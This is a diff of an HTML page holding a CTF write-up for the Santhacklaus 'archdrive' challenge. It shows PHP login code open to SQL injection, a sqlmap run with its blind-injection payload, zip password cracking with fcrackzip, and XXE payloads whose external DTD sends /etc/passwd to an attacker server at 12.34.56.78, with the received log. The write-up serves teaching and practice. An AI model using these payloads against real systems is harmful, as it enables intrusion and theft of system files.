+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $user <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_real_escape_string</span>($bdd, <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
+</span></span><span style="display:flex;"><span>        $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT user,password FROM `access-users` WHERE user=&#39;&#34;</span> <span style="color:#f92672">.</span> $user <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; AND password=&#39;&#34;</span> <span style="color:#f92672">.</span> $pass <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_query</span>($bdd, $sql);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $num_row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_num_rows</span>($res);
+</span></span><span style="display:flex;"><span>        $row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_fetch_assoc</span>($res);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($num_row <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $user <span style="color:#f92672">===</span> $row[<span style="color:#e6db74">&#39;user&#39;</span>]) {
+</span></span><span style="display:flex;"><span>            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;true&#39;</span>;
+</span></span><span style="display:flex;"><span>            $_SESSION[<span style="color:#e6db74">&#39;logged&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: myfiles.php&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;false&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>There are severals interestings things here :</p>
 <ul>
 <li>Database credentials but useless because the database works on internal server (172.17.0.11 - saw in /etc/hosts)</li>
 <li>Vulnerable code</li>
@@ -364,9 +363,9 @@ $state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</spa
     </p>
 </div>
 <p>If you look closer to the code, you see a huge mistake. Look at this 2 lines :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_real_escape_string</span>($bdd, <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
-$pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
-</code></pre></div><p>The developper sanitize the <code>$user</code> variable but forgot to sanitize the <code>$pass</code> variable. Too bad, suddenly it&rsquo;s possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of <code>reset.php</code> you can clearly read <code>Email (only from @archdrive.corp)</code>. So we can guess a correct email could be <code>g0ld3n_us3r@archdrive.corp</code> (referer to the /etc/passwd file). So let&rsquo;s try this !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_real_escape_string</span>($bdd, <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
+</span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
+</span></span></code></pre></div><p>The developper sanitize the <code>$user</code> variable but forgot to sanitize the <code>$pass</code> variable. Too bad, suddenly it&rsquo;s possible to do some sql injection on the field password in the login form. But if you read the source code, you must have the good username. When you watch carefully the html code of <code>reset.php</code> you can clearly read <code>Email (only from @archdrive.corp)</code>. So we can guess a correct email could be <code>g0ld3n_us3r@archdrive.corp</code> (referer to the /etc/passwd file). So let&rsquo;s try this !</p>
 <p><img src="/img/santhacklaus/arch9.png" alt="">
 <img src="/img/santhacklaus/arch10.png" alt=""></p>
 <p>Wonderful ! We are logged in ! But for people (like me) who don&rsquo;t like guessing, you can have the account credentials with the help of Sqlmap.</p>
@@ -376,31 +375,31 @@ $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#
     
     </p>
 </div>
-<pre tabindex="0"><code>csqlmap -u &quot;https://archdrive.santhacklaus.xyz/login.php&quot; --data &quot;email=a@b.c&amp;pass=password&quot; -p &quot;pass&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+<pre tabindex="0"><code>csqlmap -u &#34;https://archdrive.santhacklaus.xyz/login.php&#34; --data &#34;email=a@b.c&amp;pass=password&#34; -p &#34;pass&#34; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
- ___ ___[&quot;]_____ ___ ___  {1.2.11#stable}
-|_ -| . [(]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
+ ___ ___[&#34;]_____ ___ ___  {1.2.11#stable}
+|_ -| . [(]     | .&#39;| . |
+|___|_  [&#39;]_|_|_|__,|  _|
       |_|V          |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
 [*] starting at 12:30:20
 
-[12:30:20] [INFO] fetched random HTTP User-Agent header value 'Opera/9.63 (Windows NT 5.1; U; pt-BR) Presto/2.1.1' from file '/opt/sqlmap/txt/user-agents.txt'
-[12:30:26] [INFO] testing for SQL injection on POST parameter 'pass'
-[12:30:27] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'
+[12:30:20] [INFO] fetched random HTTP User-Agent header value &#39;Opera/9.63 (Windows NT 5.1; U; pt-BR) Presto/2.1.1&#39; from file &#39;/opt/sqlmap/txt/user-agents.txt&#39;
+[12:30:26] [INFO] testing for SQL injection on POST parameter &#39;pass&#39;
+[12:30:27] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind&#39;
 [12:30:27] [WARNING] time-based comparison requires larger statistical model, please wait............................  (done)
-[12:30:58] [INFO] POST parameter 'pass' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind' injectable
-[12:30:58] [INFO] checking if the injection point on POST parameter 'pass' is a false positive
-POST parameter 'pass' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[12:30:58] [INFO] POST parameter &#39;pass&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind&#39; injectable
+[12:30:58] [INFO] checking if the injection point on POST parameter &#39;pass&#39; is a false positive
+POST parameter &#39;pass&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
 ---
 Parameter: pass (POST)
     Type: AND/OR time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind
-    Payload: email=a@b.c&amp;pass=password'||(SELECT 0x6d6c4677 FROM DUAL WHERE 8546=8546 AND SLEEP(5))||'
+    Payload: email=a@b.c&amp;pass=password&#39;||(SELECT 0x6d6c4677 FROM DUAL WHERE 8546=8546 AND SLEEP(5))||&#39;
 ---
 [12:32:49] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx
@@ -431,7 +430,7 @@ Archive:  recup.zip
       377                     1 file
 </code></pre><p>Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don&rsquo;t forget -u !</p>
 <pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip
-found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
+found file &#39;password.txt&#39;, (size cp/uc    271/   377, flags 9, chk 5aec)
 
 PASSWORD FOUND!!!!: pw == hackerman
 </code></pre><p>Nice ! So we can decompress the archive and read the content of <code>password.txt</code></p>
@@ -532,27 +531,27 @@ IMTLD{I_h4v3_N0th1ng_T0_h1d3}
 <h1 id="4th-step---dive-in-blackhat-underground">4th step - Dive in BlackHat underground</h1>
 <p><img src="/img/santhacklaus/arch14.png" alt=""></p>
 <p>If you look carefully to the files obtained at the last step, you will see an interesting archive : <code>Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip</code>. Unzip it !</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">Archive: Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
-inflating: README.md  
- inflating: ticket.xml
-</code></pre></div><p>This is the content of <code>README.md</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md"><span style="color:#75715e">### This ticket is the property of `Dark Lottery`
-</span><span style="color:#75715e"></span>
-If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
-This ticket is unique, do not share it.
-Remember to use it at your own risk.
-
-Thank you for your purchase !
-
---- scgz54b2lftqkkvn.onion ---
-</code></pre></div><p>And this is the content of ticket.xml</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
-    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/date&gt;</span>
-<span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p>In <code>README.md</code> you&rsquo;ve got a link to website in .onion. Fire Tor and navigate to this url</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>Archive: Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
+</span></span><span style="display:flex;"><span>inflating: README.md  
+</span></span><span style="display:flex;"><span> inflating: ticket.xml
+</span></span></code></pre></div><p>This is the content of <code>README.md</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span><span style="color:#75715e">### This ticket is the property of `Dark Lottery`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
+</span></span><span style="display:flex;"><span>This ticket is unique, do not share it.
+</span></span><span style="display:flex;"><span>Remember to use it at your own risk.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Thank you for your purchase !
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- scgz54b2lftqkkvn.onion ---
+</span></span></code></pre></div><p>And this is the content of ticket.xml</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;ticket&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/date&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ticket&gt;</span>
+</span></span></code></pre></div><p>In <code>README.md</code> you&rsquo;ve got a link to website in .onion. Fire Tor and navigate to this url</p>
 <p><img src="/img/santhacklaus/arch15.png" alt=""></p>
 <p>Huuuu ! Nice blackhat theme ! This website is for real hacker !
 The website is really simple. There is 2 pages :</p>
@@ -564,34 +563,34 @@ The website is really simple. There is 2 pages :</p>
 <p>This a game for us ! For blackhat like us ! Let&rsquo;s play the game and send our ticket.</p>
 <p><img src="/img/santhacklaus/arch17.png" alt=""></p>
 <p>Humm. Yep ! There is a mistake is our xml. This is better</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;ticket&gt;</span>
-    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
-<span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p><img src="/img/santhacklaus/arch18.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;ticket&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ticket&gt;</span>
+</span></span></code></pre></div><p><img src="/img/santhacklaus/arch18.png" alt=""></p>
 <p>Ho sad ! We lost ! :(
 Stop crying boy. Lets go pwn this illegal lottery to uphold the law.</p>
 <p>When I heard the word XML, I think immediately to XXE vulnerability. Indeed, this is the good way. Its always really annoying to display something when you do some XXE injection. The simple way is to execute a simple GET request from the victim server to your own server to detect the vulnerability. You will find below a really simple example.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
-
-<span style="color:#75715e">&lt;!DOCTYPE root [
-</span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
-    <span style="color:#75715e">&lt;!ENTITY % ext SYSTEM &#34;http://12.34.56.78:4444&#34;&gt;</span>
-    %ext;
-]&gt;
-
-<span style="color:#f92672">&lt;ticket&gt;</span>
-    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
-<span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p>On your server (here <code>12.34.56.78</code>) you just have to launch a listener (netcat, python, apache2, like you want&hellip;). I will choose python because it will be helpull later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % ext SYSTEM &#34;http://12.34.56.78:4444&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>    %ext;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ticket&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ticket&gt;</span>
+</span></span></code></pre></div><p>On your server (here <code>12.34.56.78</code>) you just have to launch a listener (netcat, python, apache2, like you want&hellip;). I will choose python because it will be helpull later.</p>
 <pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
-51.75.202.113 - - [27/Dec/2018 23:18:20] &quot;GET / HTTP/1.0&quot; 200 -
+51.75.202.113 - - [27/Dec/2018 23:18:20] &#34;GET / HTTP/1.0&#34; 200 -
 </code></pre><p>Alright ! We received a GET request just after send our ticket. So how can we go further now ?</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
@@ -608,36 +607,36 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 </ol>
 <p>Still not clear ? See the example</p>
 <p>Here we have our malicious ticket. When the victim server will read this ticket, it will load the malicous code hosted on attacker&rsquo;s server</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
-
-<span style="color:#75715e">&lt;!DOCTYPE root [
-</span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
-    <span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;http://12.34.56.78:4444/exploit.dtd&#34;&gt;</span>
-    %sp;
-    %param1;
-]&gt;
-
-<span style="color:#f92672">&lt;ticket&gt;</span>
-    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
-    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
-    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
-    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
-    <span style="color:#f92672">&lt;root&gt;</span>&amp;external;<span style="color:#f92672">&lt;/root&gt;</span>
-<span style="color:#f92672">&lt;/ticket&gt;</span>
-</code></pre></div><p>Here we have our malicious code : <code>exploit.dtd</code>. It will compress, base64 encode and send to the attacker&rsquo;s server the <code>/etc/passwd</code> file</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/read=bzip2.compress/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://12.34.56.78:4444/?data=%data;&#39;&gt;</span>&#34;&gt;
-</code></pre></div><p>And on the attacker’s server we receive the extracted data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ELEMENT root ANY &gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;http://12.34.56.78:4444/exploit.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>    %sp;
+</span></span><span style="display:flex;"><span>    %param1;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ticket&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;number&gt;</span>14453<span style="color:#f92672">&lt;/number&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;status&gt;</span>valid<span style="color:#f92672">&lt;/status&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;date&gt;</span>20/12/2018<span style="color:#f92672">&lt;/date&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;type&gt;</span>premium<span style="color:#f92672">&lt;/type&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;root&gt;</span>&amp;external;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ticket&gt;</span>
+</span></span></code></pre></div><p>Here we have our malicious code : <code>exploit.dtd</code>. It will compress, base64 encode and send to the attacker&rsquo;s server the <code>/etc/passwd</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/read=bzip2.compress/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://12.34.56.78:4444/?data=%data;&#39;&gt;</span>&#34;&gt;
+</span></span></code></pre></div><p>And on the attacker’s server we receive the extracted data</p>
 <pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 
 # This is the first GET request to obtain the malicious file
-51.75.202.113 - - [27/Dec/2018 23:41:22] &quot;GET /exploit.dtd HTTP/1.0&quot; 200 -
+51.75.202.113 - - [27/Dec/2018 23:41:22] &#34;GET /exploit.dtd HTTP/1.0&#34; 200 -
 
 # This is the second GET request with exfiltrate data (here /etc/passwd)
-51.75.202.113 - - [27/Dec/2018 23:41:22] &quot;GET /?xxe=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0&quot; 200 -
+51.75.202.113 - - [27/Dec/2018 23:41:22] &#34;GET /?xxe=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ